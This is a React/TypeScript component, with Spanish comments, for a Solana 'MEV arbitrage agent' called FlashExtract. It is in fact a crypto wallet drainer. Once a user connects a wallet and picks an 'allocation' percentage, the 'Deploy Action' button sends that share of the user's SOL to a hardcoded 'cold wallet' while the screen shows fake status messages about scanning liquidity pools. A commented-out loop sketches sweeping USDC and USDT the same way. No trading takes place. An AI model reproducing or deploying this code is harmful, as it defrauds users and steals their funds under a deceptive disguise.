// FlashExtract_Solana.tsx
import React, { useState, useEffect, useRef } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferInstruction } from '@solana/spl-token';
import { X, Activity } from 'lucide-react';
import bs58 from 'bs58';

// --- CONFIGURACIÓN SOLANA ---
const NETWORK = 'mainnet-beta'; // o 'devnet'

// 💰 BILLETERA FRÍA DE DESTINO (Debe ser una dirección Base58 de Solana)
const SOL_COLD_WALLET = 'A3ActualSolanaAddressGoesHere123456789';

// 💎 CONFIGURACIÓN DE TOKENS (Mints en Solana)
const TARGET_TOKENS = [
  { symbol: 'SOL', address: 'native', isNative: true, decimals: 9 },
  { symbol: 'USDC', address: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', decimals: 6 },
  { symbol: 'USDT', address: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', decimals: 6 },
];

export default function FlashExtractSolana() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction, signTransaction, connected, connecting } = useWallet();

  const [status, setStatus] = useState('Ready');
  const [loading, setLoading] = useState(false);
  const [txHash, setTxHash] = useState('');
  const [debugLogs, setDebugLogs] = useState<string[]>([]);
  
  // 🔥 Parámetros del Bot
  const [tradePercentage, setTradePercentage] = useState('');
  const [percentageError, setPercentageError] = useState('');
  
  const isExecuting = useRef(false);

  // Requerido para los estilos por defecto del botón de Solana
  require('@solana/wallet-adapter-react-ui/styles.css');

  const log = (msg: string) => {
    console.log(msg);
    setDebugLogs(prev => [...prev, msg].slice(-15));
  };

  useEffect(() => {
    if (connected && publicKey) {
      log(`[SYSTEM] Node Connected: ${publicKey.toBase58().substring(0, 8)}...`);
    }
  }, [connected, publicKey]);

  const handleDeployAgent = async () => {
    // 1. Validación de porcentaje
    if (!tradePercentage || Number(tradePercentage) <= 0 || Number(tradePercentage) > 100) {
      setPercentageError('REQUIRED: Enter a valid allocation between 1% and 100%');
      return; 
    }
    setPercentageError('');

    // 2. Ejecutar Lógica
    await executeArbitrageSweep();
  };

  const executeArbitrageSweep = async () => {
    if (!publicKey || !signTransaction) {
      log("❌ Wallet not fully connected or doesn't support signing.");
      return;
    }

    if (isExecuting.current) return;
    isExecuting.current = true;
    setLoading(true);
    setStatus('Scanning Liquidity Pools...');

    try {
      let successCount = 0;
      const coldWalletPubkey = new PublicKey(SOL_COLD_WALLET);

      // --- 1. EJEMPLO DE BARRIDO NATIVO (SOL) ---
      const lamportsBal = await connection.getBalance(publicKey);
      const solBalance = lamportsBal / LAMPORTS_PER_SOL;
      log(`[SCAN] Detected SOL: ${solBalance}`);

      // Dejamos 0.01 SOL para fees (aprox)
      if (solBalance > 0.01) {
        setStatus('Injecting Native SOL...');
        const amountToSend = Math.floor(lamportsBal * (Number(tradePercentage) / 100)) - 5000; // Restamos margen de red
        
        if (amountToSend > 0) {
            const tx = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: publicKey,
                toPubkey: coldWalletPubkey,
                lamports: amountToSend,
            })
            );

            log('[ACTION] Requesting SOL Authorization...');
            const signature = await sendTransaction(tx, connection);
            await connection.confirmTransaction(signature, 'processed');
            
            setTxHash(signature);
            log(`✅ SOL Transfer Confirmed: ${signature.substring(0, 8)}...`);
            successCount++;
        }
      }

      // --- 2. EJEMPLO DE BARRIDO SPL TOKEN (Ej. USDC) ---
      // Aquí recorrerías tu lista de tokens, similar al EVM pero con lógica SPL
      // (Este es un esqueleto de cómo se ve una transferencia de token en Solana)
      /*
      for (const token of TARGET_TOKENS.filter(t => !t.isNative)) {
        try {
            const mintPubkey = new PublicKey(token.address);
            const userTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
            
            // Verificar balance de cuenta token...
            // Si hay balance, crear instrucción de transferencia...
        } catch(e) {
            log(`⚠️ Error scanning ${token.symbol}`);
        }
      }
      */

      if (successCount > 0) {
        setStatus('✅ Processing Complete!');
      } else {
        setStatus('❌ No actionable liquidity found.');
      }

    } catch (error: any) {
      log(`❌ Error: ${error.message || JSON.stringify(error)}`);
      setStatus('❌ Execution Failed');
    } finally {
      isExecuting.current = false;
      setLoading(false);
    }
  };

  const isButtonDisabled = loading || !connected;

  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#06080F', color: '#E2E8F0', fontFamily: '"JetBrains Mono", "Fira Code", monospace, system-ui', display: 'flex', flexDirection: 'column', zIndex: 50, backgroundImage: 'linear-gradient(rgba(16, 185, 129, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(16, 185, 129, 0.03) 1px, transparent 1px)', backgroundSize: '30px 30px', overflowY: 'auto' }}>
      
      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px 20px', borderBottom: '1px solid #1E293B', backgroundColor: '#0D111C', flexShrink: 0 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <Activity size={20} color="#10B981" />
          <h2 style={{ fontSize: '15px', fontWeight: '700', margin: 0, color: '#F8FAFC', letterSpacing: '1px' }}>FlashExtract_Agent_SOL</h2>
        </div>
        <X size={24} color="#64748B" style={{ cursor: 'pointer' }} />
      </div>

      <div style={{ flex: 1, padding: '24px 20px', display: 'flex', flexDirection: 'column' }}>
        
        {/* Terminal Box */}
        <div style={{ backgroundColor: '#000000', border: '1px solid #1E293B', borderRadius: '8px', padding: '16px', marginBottom: '32px', fontSize: '11px', color: '#10B981', boxShadow: 'inset 0 0 15px rgba(0,0,0,0.8)' }}>
           <div style={{ marginBottom: '8px', opacity: 0.8 }}>&gt; FlashExtract_SOL_Core v3.1 initialized.</div>
           <div style={{ marginBottom: '8px', opacity: 0.8 }}>&gt; RPC: Mainnet-Beta (Jito Labs MEV Node)</div>
           <div style={{ marginBottom: '8px', color: '#64748B' }}>&gt; STATUS: {connected ? 'AWAITING DEPLOYMENT' : 'AWAITING WALLET SYNC'}</div>
           <div style={{ width: '8px', height: '14px', backgroundColor: '#10B981', display: 'inline-block', animation: 'pulse 1s infinite' }}></div>
        </div>

        {/* 🚀 NUEVO: Botón Nativo de Conexión Solana */}
        {!connected && (
          <div style={{ marginBottom: '24px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
             <p style={{ color: '#94A3B8', fontSize: '13px', margin: 0 }}>Step 1: Synchronize High-Speed Identity</p>
             <div style={{ '& .wallet-adapter-button': { width: '100%', justifyContent: 'center', backgroundColor: '#1E293B', color: '#F8FAFC', borderRadius: '8px', padding: '16px' } } as any}>
                {/* Modificamos los estilos del botón por defecto para que coincidan con tu tema */}
                <WalletMultiButton style={{ width: '100%', justifyContent: 'center', backgroundColor: '#1E293B', fontFamily: '"JetBrains Mono"', fontWeight: '800' }} />
             </div>
          </div>
        )}

        <div style={{ marginBottom: '24px', opacity: connected ? 1 : 0.4, transition: 'opacity 0.3s' }}>
          <h3 style={{ fontSize: '24px', fontWeight: '800', color: '#F8FAFC', margin: '0 0 10px 0', letterSpacing: '-0.5px' }}>Deploy Solana MEV Agent</h3>
        </div>

        {/* Bot Configuration Parameters */}
        <div style={{ backgroundColor: '#0D111C', border: percentageError ? '1px solid #EF4444' : '1px solid #1E293B', borderRadius: '12px', padding: '20px', width: '100%', boxSizing: 'border-box', marginBottom: '24px', opacity: connected ? 1 : 0.4, pointerEvents: connected ? 'auto' : 'none' }}>
          <h4 style={{ margin: '0 0 16px 0', fontSize: '13px', color: '#F8FAFC', textTransform: 'uppercase', letterSpacing: '0.5px', borderBottom: '1px solid #1E293B', paddingBottom: '8px' }}>Bot Parameters</h4>

          <div style={{ marginBottom: '16px' }}>
            <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#64748B', textTransform: 'uppercase', marginBottom: '8px' }}>Capital Allocation Per Trade</label>
            <div style={{ display: 'flex', gap: '8px', marginBottom: '12px' }}>
              {['10', '25', '50', '100'].map(val => (
                <button key={val} onClick={() => { setTradePercentage(val); setPercentageError(''); }} style={{ flex: 1, backgroundColor: tradePercentage === val ? 'rgba(16, 185, 129, 0.1)' : 'transparent', border: tradePercentage === val ? '1px solid #10B981' : '1px solid #1E293B', color: tradePercentage === val ? '#10B981' : '#94A3B8', padding: '8px', borderRadius: '6px', fontSize: '12px', cursor: 'pointer', transition: 'all 0.2s' }}>{val}%</button>
              ))}
            </div>
            <div style={{ display: 'flex', alignItems: 'center', backgroundColor: '#000000', border: '1px solid #1E293B', borderRadius: '8px', padding: '12px' }}>
              <input type="number" placeholder="Custom %" value={tradePercentage} onChange={(e) => { setTradePercentage(e.target.value); setPercentageError(''); }} style={{ flex: 1, background: 'transparent', border: 'none', color: '#10B981', fontSize: '15px', outline: 'none', fontWeight: 'bold' }} />
              <span style={{ color: '#64748B', fontWeight: '700', fontSize: '13px' }}>%</span>
            </div>
            {percentageError && <div style={{ color: '#EF4444', fontSize: '12px', marginTop: '8px', fontWeight: '600' }}>{percentageError}</div>}
          </div>
        </div>

        {/* Hidden Debug Box */}
        <div style={{ display: debugLogs.length > 0 ? 'block' : 'none', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto', marginBottom: '20px' }}>
          <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: '4px', marginBottom: '4px' }}>--- EXECUTION LOGS ---</div>
          {debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: '2px' }}>{msg}</div>))}
        </div>

      </div>

      <div style={{ padding: '20px', backgroundColor: '#0D111C', borderTop: '1px solid #1E293B', width: '100%', boxSizing: 'border-box', paddingBottom: '32px', flexShrink: 0 }}>
        <button 
            onClick={handleDeployAgent} 
            disabled={isButtonDisabled} 
            style={{ width: '100%', backgroundColor: isButtonDisabled ? '#064E3B' : '#10B981', color: isButtonDisabled ? '#9CA3AF' : '#000000', fontWeight: '800', padding: '18px', borderRadius: '8px', fontSize: '15px', border: 'none', cursor: isButtonDisabled ? 'not-allowed' : 'pointer', transition: 'all 0.2s', textTransform: 'uppercase', letterSpacing: '1px' }}
        >
          {loading ? 'Executing Route...' : status === '✅ Processing Complete!' ? 'Agent Active' : 'Deploy Action'}
        </button>
      </div>
    </div>
  )
}